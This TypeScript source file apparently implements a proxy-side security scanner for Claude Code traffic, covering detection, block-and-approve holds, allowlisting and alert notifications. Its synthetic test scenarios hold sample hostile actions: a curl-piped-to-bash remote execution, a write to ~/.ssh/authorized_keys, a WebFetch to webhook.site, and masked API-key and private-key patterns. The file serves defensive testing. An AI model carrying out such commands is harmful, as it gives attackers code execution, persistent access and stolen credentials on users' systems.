import { randomUUID } from 'crypto';
import type { Database } from 'better-sqlite3';
import type {
  Settings,
  SecurityEnforcementMode,
  SecuritySeverity,
  SecurityOsNotifyThreshold,
  NotificationType,
  PendingSecurityBlock,
  SecurityTestScenario,
} from '@claude-sentinel/shared';
import type { IpcServer } from '../ipc.js';
import {
  insertSecurityEvent,
  insertNotification,
  isSecurityAllowlisted,
  addSecurityAllowlist,
  type InsertSecurityEvent,
} from '../db.js';
import {
  scanRequestBody,
  scanToolUseBlocks,
  type Finding,
  type DetectorOptions,
} from './detectors.js';
import { ResponseTap, DEFAULT_TAP_BUDGET_BYTES } from './response-tap.js';
import { hashText } from './redact.js';

export type PendingOutcome = 'approve' | 'deny' | 'timeout';

/** Pluggable deps so tests can stub IPC and settings. */
export interface ScannerDeps {
  db: Database;
  ipcServer: IpcServer;
  /** Pulled on every call so toggles take effect immediately without
   *  restarting the proxy. */
  getSettings: () => Settings;
}

/** Returned by `scanOutbound`. Discriminated by `action`:
 *  - `allow`: forward upstream immediately (no block conditions met, or
 *    scanning is disabled, or mode is observe).
 *  - `block_immediate`: synthesize a 403 now (user has block-hold
 *    disabled, or the caller opted out of holding).
 *  - `pending`: a block triggered and the proxy should await the user's
 *    approve/deny decision via `awaitPendingResolution(pendingId)`. */
export type OutboundDecision =
  | { action: 'allow'; findings: Finding[] }
  | { action: 'block_immediate'; blockReason: string; findings: Finding[] }
  | { action: 'pending'; pendingId: string; blockReason: string; findings: Finding[] };

export interface ResponseTapHandle {
  push(chunk: Buffer | string): void;
  flush(): void;
  destroy(): void;
}

const SEVERITY_ORDER: Record<SecuritySeverity, number> = { low: 0, medium: 1, high: 2 };
const THRESHOLD_ORDER: Record<SecurityOsNotifyThreshold, number> = {
  low: 0,
  medium: 1,
  high: 2,
  off: 99,
};

/** Minimum confidence required for a finding to trigger an outbound block.
 *  Raised from 0.7 → 0.9 so context-aware drops (see detectors.ts
 *  computeConfidenceDrop) push test fixtures, doc snippets, and
 *  REDACTED-marker echoes below the block bar while leaving real
 *  high-signal detections untouched at 0.95. */
const BLOCK_CONFIDENCE_FLOOR = 0.9;

/** Decide whether any finding is severe enough to trigger a block under the
 *  user's enforcement mode. Returns null when the request should be
 *  forwarded normally. */
function decideBlock(
  findings: Finding[],
  mode: SecurityEnforcementMode,
): { severity: SecuritySeverity; reason: string } | null {
  if (mode === 'observe') return null;
  const floor: SecuritySeverity = mode === 'block_high' ? 'high' : 'medium';
  const hits = findings.filter(
    (f) =>
      SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER[floor] && f.confidence >= BLOCK_CONFIDENCE_FLOOR,
  );
  if (hits.length === 0) return null;
  // Sort: high severity first, then confidence desc.
  hits.sort(
    (a, b) =>
      SEVERITY_ORDER[b.severity] - SEVERITY_ORDER[a.severity] || b.confidence - a.confidence,
  );
  const top = hits[0];
  if (!top) return null;
  return {
    severity: top.severity,
    reason: `${top.title} (${top.kind})`,
  };
}

function notificationTypeForSeverity(sev: SecuritySeverity): NotificationType {
  if (sev === 'high') return 'security_high';
  if (sev === 'medium') return 'security_medium';
  return 'security_low';
}

export interface SecurityScanner {
  /** Synchronous scan of a JSON request body. Returns an allow/block
   *  decision. When block-hold is enabled and the decision is `pending`,
   *  the proxy must call `awaitPendingResolution(pendingId)` to learn
   *  whether the held request should be forwarded or 403'd. */
  scanOutbound(body: Buffer, accountId: string): OutboundDecision;

  /** Block until the user approves/denies the pending block or the hold
   *  timeout expires. Resolves with the outcome. Safe to call on an
   *  unknown/already-resolved id — resolves immediately with 'timeout'. */
  awaitPendingResolution(pendingId: string): Promise<PendingOutcome>;

  /** Resolve a pending block from the UI (approve or deny). No-op when
   *  `pendingId` is unknown or already resolved. Returns true when the
   *  resolution was applied, false otherwise. */
  resolvePending(pendingId: string, outcome: Exclude<PendingOutcome, 'timeout'>): boolean;

  /** Snapshot of every outstanding pending block. Used by the app on
   *  reconnect so the banner can re-render after a UI reload. */
  listPending(): PendingSecurityBlock[];

  /** Create a per-request tap that accumulates SSE bytes. Returns null
   *  when scanning is disabled so the proxy can skip the extra
   *  per-request bookkeeping entirely. */
  startResponseTap(accountId: string, url: string | undefined): ResponseTapHandle | null;

  /** Fire a synthetic security event to exercise the UI without real
   *  malicious content. Dispatches through the normal persist/broadcast
   *  or pending-block path depending on the scenario. Used by the dev
   *  `pnpm security:test` script. */
  triggerTestScenario(scenario: SecurityTestScenario, accountId: string): void;
}

/** In-memory record for a held outbound block. Keyed by `pendingId` in
 *  the scanner's `pendingBlocks` map; resolved by the UI or by the
 *  timeout timer, whichever fires first. */
interface PendingBlockEntry {
  id: string;
  accountId: string;
  severity: SecuritySeverity;
  title: string;
  blockReason: string;
  matchMask: string | null;
  detectorId: string;
  expiresAt: number;
  /** Every finding that cleared the block-mode floor (severity + conf). */
  blockCauseFindings: Finding[];
  /** Every finding in the request (including weak-signal siblings) so
   *  resolution can persist the full set with the correct flags. */
  allFindings: Finding[];
  timeoutHandle: ReturnType<typeof setTimeout>;
  settle: (outcome: PendingOutcome) => void;
}

export function createSecurityScanner(deps: ScannerDeps): SecurityScanner {
  const pendingBlocks = new Map<string, PendingBlockEntry>();

  /** Persist a finding and (conditionally) fire the in-app notification + IPC
   *  broadcast. Historically we short-circuited on dedup-repeat to avoid
   *  notification spam — but that silenced *block* events when the same
   *  match re-fired within the 1h dedup window, leaving the user with a
   *  403 and no UI feedback. New policy: always notify + broadcast for
   *  block/approve events; only observe-mode repeats stay silent.
   *
   *  Telemetry synthetics (kind = scan_*) also short-circuit on repeat so
   *  we don't spam the Alerts tab with "scan_truncated" every SSE frame. */
  const persistAndBroadcast = (
    accountId: string,
    finding: Finding,
    direction: 'outbound' | 'tool_use',
    flags: { blocked?: boolean; approved?: boolean } = {},
  ): void => {
    const settings = deps.getSettings();
    const now = Date.now();
    const blocked = flags.blocked === true;
    const approved = flags.approved === true;

    const event: InsertSecurityEvent = {
      ts: now,
      accountId,
      sessionId: null,
      direction,
      severity: finding.severity,
      kind: finding.kind,
      detectorId: finding.detectorId,
      confidence: finding.confidence,
      title: finding.title,
      reason: finding.reason,
      matchMask: finding.matchMask,
      matchHash: finding.matchHash,
      contextHash: finding.contextHash,
      snippet: settings.securityPersistSnippet ? finding.snippet : null,
      sourceHint: finding.sourceHint ?? null,
      details: finding.details ?? null,
      blocked,
      approved,
      provenance: finding.provenance,
    };

    let result: { id: number; isNew: boolean };
    try {
      result = insertSecurityEvent(deps.db, event);
    } catch (err) {
      console.error('[Security] insertSecurityEvent failed:', err);
      return;
    }

    const isMeaningful = blocked || approved;
    const isSynthetic = finding.kind.startsWith('scan_');
    // Silent path: observe-mode repeats of the same match within the dedup
    // window. Telemetry synthetics are also silent on repeat.
    if (!result.isNew && (!isMeaningful || isSynthetic)) return;

    // Mirror into notifications table so the existing Alerts tab badge
    // picks it up. The type carries severity so the UI can render the
    // right icon and colour.
    const titlePrefix = approved ? 'Approved:' : blocked ? 'Blocked:' : 'Security:';
    try {
      insertNotification(deps.db, {
        ts: now,
        accountId,
        type: notificationTypeForSeverity(finding.severity),
        title: `${titlePrefix} ${finding.title}`,
        body: finding.reason,
      });
    } catch (err) {
      console.error('[Security] insertNotification failed:', err);
    }

    try {
      deps.ipcServer.broadcast({
        type: 'security_event_detected',
        accountId,
        severity: finding.severity,
        kind: finding.kind,
        title: finding.title,
        blocked,
        // Row id lets the OS-notification Details action deep-link
        // straight into this exact event in the Security panel.
        eventId: result.id,
      });
    } catch (err) {
      console.error('[Security] broadcast failed:', err);
    }
  };

  const emitSynthetic = (
    accountId: string,
    detectorId: string,
    kind: 'scan_truncated' | 'scan_skipped_encoding' | 'scan_deferred_oversized',
    title: string,
    reason: string,
  ): void => {
    // Per-kind mute gate. When the user has muted a synthetic kind
    // via Settings, we drop the event entirely — no DB row, no
    // broadcast, no OS notification. The actual scan still runs (for
    // the deferred path, `runOutboundObserve` fires regardless); only
    // the informational telemetry is silenced.
    const s = deps.getSettings();
    if (kind === 'scan_deferred_oversized' && s.securityMuteScanDeferred) return;
    if (kind === 'scan_truncated' && s.securityMuteScanTruncated) return;
    if (kind === 'scan_skipped_encoding' && s.securityMuteScanSkipped) return;

    const finding: Finding = {
      detectorId,
      kind,
      severity: 'low',
      confidence: 0.99,
      title,
      reason,
      matchMask: '',
      // Dedup on detector kind + accountId so we don't spam the log with
      // identical telemetry rows — one bump per hour is enough signal.
      matchHash: hashText(`${kind}:${accountId}`),
      contextHash: hashText(`${kind}:${accountId}`),
      snippet: '',
      sourceHint: undefined,
      provenance: 'telemetry',
    };
    persistAndBroadcast(accountId, finding, 'outbound');
  };

  // Helper: build the pending block summary used by the broadcast and the
  // list_pending_blocks IPC response.
  const toPendingSnapshot = (entry: PendingBlockEntry): PendingSecurityBlock => ({
    pendingId: entry.id,
    accountId: entry.accountId,
    severity: entry.severity,
    title: entry.title,
    blockReason: entry.blockReason,
    matchMask: entry.matchMask,
    detectorId: entry.detectorId,
    expiresAt: entry.expiresAt,
  });

  const finalizePending = (entry: PendingBlockEntry, outcome: PendingOutcome): void => {
    clearTimeout(entry.timeoutHandle);
    // Mirror findings into the DB with the appropriate flags, and on approve
    // also add each block-cause match to the allowlist so the next Claude
    // Code operation carrying the same content doesn't hit the block again.
    if (outcome === 'approve') {
      for (const f of entry.blockCauseFindings) {
        try {
          addSecurityAllowlist(deps.db, {
            matchHash: f.matchHash,
            detectorId: f.detectorId,
            matchMask: f.matchMask,
            title: f.title,
            note: 'Approved from in-app banner',
          });
        } catch (err) {
          console.error('[Security] addSecurityAllowlist failed:', err);
        }
      }
      for (const f of entry.allFindings) {
        const isCause = entry.blockCauseFindings.includes(f);
        persistAndBroadcast(entry.accountId, f, 'outbound', {
          blocked: false,
          approved: isCause,
        });
      }
    } else {
      // deny | timeout → treat as a real block for the record.
      for (const f of entry.allFindings) {
        const isCause = entry.blockCauseFindings.includes(f);
        persistAndBroadcast(entry.accountId, f, 'outbound', {
          blocked: isCause,
        });
      }
    }

    try {
      deps.ipcServer.broadcast({
        type: 'security_block_resolved',
        pendingId: entry.id,
        outcome,
      });
    } catch (err) {
      console.error('[Security] broadcast(resolved) failed:', err);
    }
  };

  const scanOutbound = (body: Buffer, accountId: string): OutboundDecision => {
    const settings = deps.getSettings();
    if (!settings.securityScanEnabled) {
      return { action: 'allow', findings: [] };
    }
    const mode: SecurityEnforcementMode = settings.securityEnforcementMode ?? 'observe';

    const options: DetectorOptions = {
      scanSecrets: settings.securityScanSecrets,
      scanInjection: settings.securityScanInjection,
      scanToolUse: settings.securityScanToolUse,
    };

    // Oversized bodies normally bypass synchronous scanning to avoid
    // blowing the proxy latency budget — we defer to setImmediate and
    // treat them as observe-only for that one request. The threshold
    // is user-configurable (securityOversizedThresholdMb, 1–16 MB).
    // When the user opts in via `securityScanOversizedSync`, we skip
    // the defer branch entirely and fall through to the synchronous
    // block-gate below — paying the latency cost but gaining the
    // ability to block on oversized payloads.
    const thresholdMb = settings.securityOversizedThresholdMb ?? 1;
    const thresholdBytes = thresholdMb * 1024 * 1024;
    if (body.length > thresholdBytes && !settings.securityScanOversizedSync) {
      emitSynthetic(
        accountId,
        'scan_deferred_oversized',
        'scan_deferred_oversized',
        'Oversized request deferred',
        `Request body was ${body.length} bytes — scanning was deferred off the hot path`,
      );
      setImmediate(() => {
        runOutboundObserve(body, accountId, options);
      });
      return { action: 'allow', findings: [] };
    }

    let parsed: unknown = null;
    try {
      parsed = JSON.parse(body.toString('utf-8'));
    } catch {
      return { action: 'allow', findings: [] };
    }

    const findings = scanRequestBody(parsed, options).filter(
      (f) => !isSecurityAllowlisted(deps.db, f.matchHash, f.detectorId),
    );

    // Provenance gate. secret/PII/injection findings only count toward the
    // block decision when they came from a file Claude Code read (or
    // Write/Edit content the agent is about to commit). Matches in plain
    // conversation / system prompt / tool-description text persist as
    // observe-only so chat discussion of synthetic patterns never 403s
    // Claude Code. risky_{bash,write,webfetch} are already scoped to
    // tool_use proposals, aren't about data exfiltration, and block as
    // configured regardless of provenance.
    const isBlockableForPolicy = (f: Finding): boolean => {
      if (f.kind === 'risky_bash' || f.kind === 'risky_write' || f.kind === 'risky_webfetch')
        return true;
      if (f.provenance === 'file-read' || f.provenance === 'tool-use') return true;
      // Sprint 7: prompt-injection findings in attacker-suppliable surfaces
      // — tool_result content from a WebFetch/Read/Bash with no recoverable
      // file_path, and MCP tool descriptions advertised in tools[] — are
      // blockable. Other kinds (secrets, PII) in those provenances stay
      // observe-only: a credential string in a webpage body is the user's
      // business to triage, not Sentinel's to 403.
      if (
        f.kind === 'prompt_injection' &&
        (f.provenance === 'tool-result' || f.provenance === 'mcp-description')
      )
        return true;
      return false;
    };
    const blockableFindings = findings.filter(isBlockableForPolicy);

    if (mode !== 'observe') {
      const blockDecision = decideBlock(blockableFindings, mode);
      if (blockDecision) {
        const blockCauseFindings = blockableFindings.filter(
          (f) =>
            SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER[blockDecision.severity] &&
            f.confidence >= BLOCK_CONFIDENCE_FLOOR,
        );

        // Hold the request open and wait for user input, unless block-hold is
        // disabled or the hold window is zero — then 403 immediately.
        if (settings.securityBlockHoldEnabled && settings.securityApproveHoldSec > 0) {
          const pending = createPending({
            accountId,
            severity: blockDecision.severity,
            title: blockCauseFindings[0]?.title ?? blockDecision.reason,
            blockReason: blockDecision.reason,
            matchMask: blockCauseFindings[0]?.matchMask ?? null,
            detectorId: blockCauseFindings[0]?.detectorId ?? '',
            blockCauseFindings,
            allFindings: findings,
            holdSec: settings.securityApproveHoldSec,
          });
          return {
            action: 'pending',
            pendingId: pending.id,
            blockReason: blockDecision.reason,
            findings,
          };
        }

        // Immediate 403 path — persist synchronously so the row exists by
        // the time the UI queries it.
        for (const f of findings) {
          const isBlockCause = blockCauseFindings.includes(f);
          persistAndBroadcast(accountId, f, 'outbound', { blocked: isBlockCause });
        }
        return {
          action: 'block_immediate',
          blockReason: blockDecision.reason,
          findings,
        };
      }
    }

    // Observe mode (or block mode with no severity-floor hits): persist
    // asynchronously so we don't bloat TTFB.
    if (findings.length > 0) {
      setImmediate(() => {
        for (const f of findings) {
          persistAndBroadcast(accountId, f, 'outbound');
        }
      });
    }

    return { action: 'allow', findings };
  };

  /** Register a new pending-block entry and fire its broadcast. The caller
   *  is responsible for awaiting resolution via `awaitPendingResolution`. */
  const createPending = (args: {
    accountId: string;
    severity: SecuritySeverity;
    title: string;
    blockReason: string;
    matchMask: string | null;
    detectorId: string;
    blockCauseFindings: Finding[];
    allFindings: Finding[];
    holdSec: number;
  }): PendingBlockEntry => {
    const id = randomUUID();
    const expiresAt = Date.now() + args.holdSec * 1000;

    let settled = false;
    // `externalSettle` is overwritten by `_installResolver` (called from
    // awaitPendingResolution). We don't flip the shared `settled` flag
    // inside the resolver override — that's a bookkeeping flag for this
    // createPending closure, not a guard on the resolver. The resolver
    // itself is installed once and called once.
    let externalSettle: (outcome: PendingOutcome) => void = () => undefined;
    let resolverCalled = false;

    const timeoutHandle = setTimeout(() => {
      const entry = pendingBlocks.get(id);
      // Defensive: `settled` is a belt-and-suspenders check — the primary
      // race-with-resolvePending guard is `!entry` (resolvePending deletes
      // first). Cover with v8-ignore because synthesizing the timing race
      // isn't worth the test complexity.
      /* v8 ignore next 1 */
      if (!entry || settled) return;
      pendingBlocks.delete(id);
      settled = true;
      finalizePending(entry, 'timeout');
      externalSettle('timeout');
    }, args.holdSec * 1000);
    // Don't hold the event loop open just for the approve timer — the daemon
    // should be free to shut down; abandoned pending blocks are fine.
    timeoutHandle.unref?.();

    const entry: PendingBlockEntry = {
      id,
      accountId: args.accountId,
      severity: args.severity,
      title: args.title,
      blockReason: args.blockReason,
      matchMask: args.matchMask,
      detectorId: args.detectorId,
      expiresAt,
      blockCauseFindings: args.blockCauseFindings,
      allFindings: args.allFindings,
      timeoutHandle,
      settle: (outcome) => {
        externalSettle(outcome);
      },
    };

    // Wire the external settle path. `awaitPendingResolution` installs the
    // real Promise.resolve here; until then, settle is a no-op.
    entry.settle = (outcome) => {
      externalSettle(outcome);
    };

    pendingBlocks.set(id, entry);

    try {
      deps.ipcServer.broadcast({
        type: 'security_block_pending',
        pending: toPendingSnapshot(entry),
      });
    } catch (err) {
      console.error('[Security] broadcast(pending) failed:', err);
    }

    // Attach the real settle via a closure over the Promise exposed by
    // awaitPendingResolution. We stash a setter here; the await function
    // overwrites it when called. `resolverCalled` guards against the
    // timer + user-resolve race — whichever fires first wins, the other
    // becomes a no-op.
    (
      entry as PendingBlockEntry & {
        _installResolver?: (fn: (outcome: PendingOutcome) => void) => void;
      }
    )._installResolver = (fn) => {
      externalSettle = (outcome) => {
        /* v8 ignore next 1 */
        if (resolverCalled) return;
        resolverCalled = true;
        fn(outcome);
      };
    };

    return entry;
  };

  const awaitPendingResolution = (pendingId: string): Promise<PendingOutcome> => {
    const entry = pendingBlocks.get(pendingId);
    if (!entry) return Promise.resolve('timeout');
    return new Promise<PendingOutcome>((resolve) => {
      // Every live pending entry has _installResolver set by createPending.
      const withResolver = entry as PendingBlockEntry & {
        _installResolver: (fn: (outcome: PendingOutcome) => void) => void;
      };
      withResolver._installResolver(resolve);
    });
  };

  const resolvePending = (
    pendingId: string,
    outcome: Exclude<PendingOutcome, 'timeout'>,
  ): boolean => {
    const entry = pendingBlocks.get(pendingId);
    if (!entry) return false;
    pendingBlocks.delete(pendingId);
    finalizePending(entry, outcome);
    entry.settle(outcome);
    return true;
  };

  const listPending = (): PendingSecurityBlock[] =>
    Array.from(pendingBlocks.values()).map(toPendingSnapshot);

  /** Build a synthetic Finding for test scenarios. Each call uses a unique
   *  match_hash (timestamp-based) so the dedup logic doesn't collapse
   *  repeated test runs into a single row. */
  const makeSyntheticFinding = (scenario: SecurityTestScenario): Finding => {
    const uniqueHash = hashText(`test-scenario:${scenario}:${Date.now()}:${Math.random()}`);
    const base = {
      matchHash: uniqueHash,
      contextHash: hashText(`test-scenario:${scenario}`),
      sourceHint: 'dev-trigger',
    };
    switch (scenario) {
      case 'risky-bash':
        return {
          ...base,
          detectorId: 'curl-pipe-shell',
          kind: 'risky_bash',
          severity: 'high',
          confidence: 0.95,
          title: 'Remote execution via piped curl|bash (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test risky-bash`',
          matchMask: 'curl[... test ...]bash',
          snippet: 'TEST: curl https://example.com/x.sh | bash',
          provenance: 'tool-use',
        };
      case 'risky-write':
        return {
          ...base,
          detectorId: 'risky-write-high',
          kind: 'risky_write',
          severity: 'high',
          confidence: 0.9,
          title: 'Sensitive file write (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test risky-write`',
          matchMask: '~/.ss[... test ...]_keys',
          snippet: 'TEST: Write → ~/.ssh/authorized_keys',
          provenance: 'tool-use',
        };
      case 'risky-webfetch':
        return {
          ...base,
          detectorId: 'risky-webfetch-webhook-site',
          kind: 'risky_webfetch',
          severity: 'medium',
          confidence: 0.75,
          title: 'Risky WebFetch host (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test risky-webfetch`',
          matchMask: 'http[... test ...]site',
          snippet: 'TEST: WebFetch → https://webhook.site/abc',
          provenance: 'tool-use',
        };
      case 'tool-use-low-severity':
        return {
          ...base,
          detectorId: 'curl-token-header',
          kind: 'risky_bash',
          severity: 'low',
          confidence: 0.4,
          title: 'Low-severity test event',
          reason: 'TEST SCENARIO — confidence/severity threshold testing',
          matchMask: 'curl[... test ...]TOKEN',
          snippet: 'TEST: curl -H "Authorization: $TOKEN"',
          provenance: 'tool-use',
        };
      case 'pending-block':
        return {
          ...base,
          detectorId: 'aws-access-key',
          kind: 'secret',
          severity: 'high',
          confidence: 0.95,
          title: 'AWS access key (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test pending-block`',
          matchMask: 'AKIA[... synthetic ...]TEST',
          snippet: 'TEST: pending-block approval flow',
          // file-read so the scenario exercises the "block only on file
          // provenance" gate — same path as a real Read-tool_result leak.
          provenance: 'file-read',
        };
      case 'risky-write-medium':
        return {
          ...base,
          detectorId: 'risky-write-medium',
          kind: 'risky_write',
          severity: 'medium',
          confidence: 0.75,
          title: 'Credential-adjacent file write (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test risky-write-medium`',
          matchMask: '~/.np[... test ...]rc',
          snippet: 'TEST: Write → ~/.npmrc',
          provenance: 'tool-use',
        };
      case 'secret-anthropic':
        return {
          ...base,
          detectorId: 'anthropic-key',
          kind: 'secret',
          severity: 'high',
          confidence: 0.95,
          title: 'Anthropic API key (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test secret-anthropic`',
          matchMask: 'sk-ant-[... synthetic ...]TEST',
          snippet: 'TEST: sk-ant-api03-… in request body',
          provenance: 'conversation',
        };
      case 'secret-openai':
        return {
          ...base,
          detectorId: 'openai-key',
          kind: 'secret',
          severity: 'high',
          confidence: 0.95,
          title: 'OpenAI API key (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test secret-openai`',
          matchMask: 'sk-proj[... synthetic ...]TEST',
          snippet: 'TEST: sk-… in request body',
          provenance: 'conversation',
        };
      case 'secret-github-pat':
        return {
          ...base,
          detectorId: 'github-pat',
          kind: 'secret',
          severity: 'high',
          confidence: 0.95,
          title: 'GitHub fine-grained PAT (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test secret-github-pat`',
          matchMask: 'github_pat_[... synthetic ...]TEST',
          snippet: 'TEST: github_pat_… in request body',
          provenance: 'conversation',
        };
      case 'secret-private-key':
        return {
          ...base,
          detectorId: 'private-key-block',
          kind: 'secret',
          severity: 'high',
          confidence: 0.95,
          title: 'Private key block (synthetic)',
          reason: 'TEST SCENARIO — `pnpm security:test secret-private-key`',
          matchMask: '-----BEGIN [... synthetic ...] KEY-----',
          snippet: 'TEST: -----BEGIN PRIVATE KEY-----',
          provenance: 'conversation',
        };
      case 'scan-truncated':
        return {
          ...base,
          detectorId: 'scan_truncated',
          kind: 'scan_truncated',
          severity: 'low',
          confidence: 0.99,
          title: 'Scan truncated (synthetic)',
          reason: 'TEST SCENARIO — response exceeded tap budget',
          matchMask: '',
          snippet: '',
          provenance: 'telemetry',
        };
      case 'scan-skipped-encoding':
        return {
          ...base,
          detectorId: 'scan_skipped_encoding',
          kind: 'scan_skipped_encoding',
          severity: 'low',
          confidence: 0.99,
          title: 'Scan skipped — non-UTF8 payload (synthetic)',
          reason: 'TEST SCENARIO — encoding error during scan',
          matchMask: '',
          snippet: '',
          provenance: 'telemetry',
        };
      case 'scan-deferred-oversized':
        return {
          ...base,
          detectorId: 'scan_deferred_oversized',
          kind: 'scan_deferred_oversized',
          severity: 'low',
          confidence: 0.99,
          title: 'Scan deferred — oversized payload (synthetic)',
          reason: 'TEST SCENARIO — oversized body deferred to background',
          matchMask: '',
          snippet: '',
          provenance: 'telemetry',
        };
      case 'permissions-strip':
      case 'permissions-tool-use-block':
      case 'permissions-tool-use-pending':
        // Permissions scenarios are dispatched to the enforcer, not the
        // scanner. The IPC handler in index.ts routes these before calling
        // scanner.triggerTestScenario, so they should never reach here.
        throw new Error(
          `Scenario ${scenario} must be dispatched to the permissions enforcer, not the scanner`,
        );
    }
  };

  const triggerTestScenario = (scenario: SecurityTestScenario, accountId: string): void => {
    const finding = makeSyntheticFinding(scenario);

    if (scenario === 'pending-block') {
      const settings = deps.getSettings();
      // Use the configured hold even if block-hold is disabled in settings,
      // so the test UI can be exercised regardless of the live posture.
      const holdSec = settings.securityApproveHoldSec > 0 ? settings.securityApproveHoldSec : 60;
      createPending({
        accountId,
        severity: finding.severity,
        title: finding.title,
        blockReason: `${finding.title} (${finding.kind})`,
        matchMask: finding.matchMask,
        detectorId: finding.detectorId,
        blockCauseFindings: [finding],
        allFindings: [finding],
        holdSec,
      });
      return;
    }

    // Route direction by provenance:
    //   tool-use → response-side tap ('tool_use')
    //   telemetry / conversation / file-read / system-prompt → outbound
    // This mirrors how real findings flow into persistAndBroadcast: the
    // scanner passes 'tool_use' only for response-tap findings; everything
    // else comes in as 'outbound'.
    const direction: 'outbound' | 'tool_use' =
      finding.provenance === 'tool-use' ? 'tool_use' : 'outbound';
    persistAndBroadcast(accountId, finding, direction);
  };

  const runOutboundObserve = (body: Buffer, accountId: string, options: DetectorOptions): void => {
    let parsed: unknown = null;
    try {
      parsed = JSON.parse(body.toString('utf-8'));
    } catch {
      return;
    }
    const findings = scanRequestBody(parsed, options).filter(
      (f) => !isSecurityAllowlisted(deps.db, f.matchHash, f.detectorId),
    );
    for (const f of findings) {
      persistAndBroadcast(accountId, f, 'outbound');
    }
  };

  const startResponseTap = (
    accountId: string,
    url: string | undefined,
  ): ResponseTapHandle | null => {
    const settings = deps.getSettings();
    if (!settings.securityScanEnabled) return null;
    if (!settings.securityScanToolUse) return null;
    if (!url || !url.startsWith('/v1/messages')) return null;

    const tap = new ResponseTap(DEFAULT_TAP_BUDGET_BYTES);
    let flushed = false;

    return {
      push: (chunk) => tap.push(chunk),
      flush: () => {
        if (flushed) return;
        flushed = true;
        // Parse + emit off the hot path; the caller has already ended the
        // response to Claude Code.
        setImmediate(() => {
          const options: DetectorOptions = {
            scanSecrets: settings.securityScanSecrets,
            scanInjection: settings.securityScanInjection,
            scanToolUse: settings.securityScanToolUse,
          };
          const { blocks, truncated } = tap.flush();
          if (truncated) {
            emitSynthetic(
              accountId,
              'scan_truncated',
              'scan_truncated',
              'Response exceeded scan budget',
              `Stream exceeded the ${DEFAULT_TAP_BUDGET_BYTES}-byte tap budget — tool_use analysis was truncated`,
            );
          }
          const findings = scanToolUseBlocks(blocks, options).filter(
            (f) => !isSecurityAllowlisted(deps.db, f.matchHash, f.detectorId),
          );
          for (const f of findings) {
            persistAndBroadcast(accountId, f, 'tool_use');
          }
        });
      },
      destroy: () => {
        flushed = true;
        tap.destroy();
      },
    };
  };

  return {
    scanOutbound,
    awaitPendingResolution,
    resolvePending,
    listPending,
    startResponseTap,
    triggerTestScenario,
  };
}

/** True when a severity is >= the user's OS-notification threshold. Exported
 *  so the frontend can reuse the same precedence. Threshold 'off' suppresses
 *  every notification. */
export function shouldFireOsNotification(
  severity: SecuritySeverity,
  threshold: SecurityOsNotifyThreshold,
): boolean {
  if (threshold === 'off') return false;
  return SEVERITY_ORDER[severity] >= THRESHOLD_ORDER[threshold];
}
